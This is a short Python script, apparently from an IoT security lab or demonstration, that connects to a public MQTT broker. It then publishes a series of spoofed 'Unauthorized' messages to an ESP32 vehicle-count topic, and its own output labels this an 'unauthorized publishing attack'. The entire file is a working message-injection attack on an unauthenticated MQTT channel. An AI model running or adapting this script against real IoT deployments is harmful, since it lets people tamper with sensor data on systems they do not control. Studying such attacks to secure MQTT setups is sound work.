import paho.mqtt.client as mqtt
import time

broker = "test.mosquitto.org"
topic = "esp32/vehicle_count"
client = mqtt.Client(protocol=mqtt.MQTTv311)


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to broker")
    else:
        print(f"Failed to connect: {rc}")


client.on_connect = on_connect
client.connect(broker, 1883, 60)
client.loop_start()

print("Starting unauthorized publishing attack...")
try:
    for i in range(10):
        client.publish(topic, f"Unauthorized: {i}")
        print(f"Published unauthorized message {i}")
        time.sleep(1)
except KeyboardInterrupt:
    print("Attack stopped")
    client.loop_stop()
    client.disconnect()
